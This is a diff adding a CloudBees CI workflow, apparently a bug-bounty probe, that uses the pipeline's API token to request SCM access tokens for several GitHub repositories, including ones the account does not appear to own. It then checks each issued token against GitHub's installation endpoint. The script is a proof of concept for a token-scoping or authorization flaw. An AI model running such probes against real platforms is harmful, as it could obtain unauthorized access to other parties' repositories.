@@ -1,0 +1,45 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe21
+
+on:
+  push:
+    branches:
+      - main
+
+permissions:
+  scm-token-own: read
+  scm-token-org: read
+
+jobs:
+  scmtok:
+    steps:
+      - name: mint-tokens
+        uses: docker://alpine:3.20
+        env:
+          CBTOK: ${{ cloudbees.api.token }}
+          CBURL: ${{ cloudbees.api.url }}
+          ORGID: ${{ cloudbees.org.id }}
+        run: |
+          apk add --no-cache curl jq >/dev/null 2>&1
+          probe() {
+            echo "--- repo: $1"
+            R=$(curl -s -w '\nHTTP:%{http_code}' -X POST \
+              -H "Authorization: Bearer $CBTOK" -H 'Content-Type: application/json' \
+              --data-raw "{\"scm_repo_url\": \"$1\"}" \
+              "$CBURL/reserved/v1/resources/$ORGID/scm-access-token")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | head -n -1)
+            TOK=$(echo "$BODY" | jq -r '.accessToken // empty' 2>/dev/null)
+            echo "$CODE"
+            if [ -n "$TOK" ]; then
+              echo "TOKEN_ISSUED len=${#TOK} prefix=$(echo "$TOK" | cut -c1-8)"
+              echo "github identity check:"
+              curl -s -o /dev/null -w 'installation-repos-http:%{http_code}\n' -H "Authorization: Bearer $TOK" https://api.github.com/installation/repositories
+            else
+              echo "no token; body: $(echo "$BODY" | head -c 200)"
+            fi
+          }
+          probe "https://github.com/huntbugbounty/cb-unify-test"
+          probe "https://github.com/cloudbees-io/checkout"
+          probe "https://github.com/octocat/Hello-World"
